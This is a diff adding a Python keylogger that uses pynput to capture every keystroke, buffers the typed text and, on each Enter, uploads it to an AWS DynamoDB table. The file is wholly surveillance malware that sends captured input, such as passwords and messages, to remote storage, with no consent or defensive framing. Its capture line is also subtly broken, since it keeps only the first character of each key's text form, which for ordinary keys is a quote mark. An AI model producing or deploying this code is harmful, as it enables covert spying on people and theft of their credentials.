@@ -1,0 +1,52 @@
+import boto3
+from pynput.keyboard import Key, Listener
+
+# AWS credentials and region
+aws_access_key = 'YOUR_AWS_ACCESS_KEY'
+aws_secret_key = 'YOUR_AWS_SECRET_KEY'
+aws_region = 'YOUR_AWS_REGION'
+
+# Initialize DynamoDB client
+dynamodb = boto3.resource('dynamodb',
+                          aws_access_key_id=aws_access_key,
+                          aws_secret_access_key=aws_secret_key,
+                          region_name=aws_region)
+table = dynamodb.Table('KeystrokeLogs')  # Replace with your DynamoDB table name
+
+# List to store characters before Enter key
+buffer = []
+
+# Function to write keystroke to DynamoDB and buffer
+def on_press(key):
+    global buffer
+    try:
+        if key == Key.enter:
+            # Join buffer into a string
+            buffered_text = ''.join(buffer)
+            
+            # Log to DynamoDB
+            response = table.put_item(
+                Item={
+                    'keystrokes': buffered_text
+                }
+            )
+            
+            print(f'Buffered text "{buffered_text}" logged to DynamoDB.')
+            
+            # Clear buffer after logging
+            buffer = []
+        else:
+            # Add character to buffer
+            buffer.append(str(key)[:1])  # Only take the first character of the key
+
+            # Keep buffer size limited to 40 characters
+            if len(buffer) > 40:
+                buffer = buffer[-40:]
+
+        print(f'Key {key} logged to buffer.')
+    except Exception as e:
+        print(f'Error logging key {key}: {e}')
+
+# Set up listener for keystrokes
+with Listener(on_press=on_press) as listener:
+    listener.join()
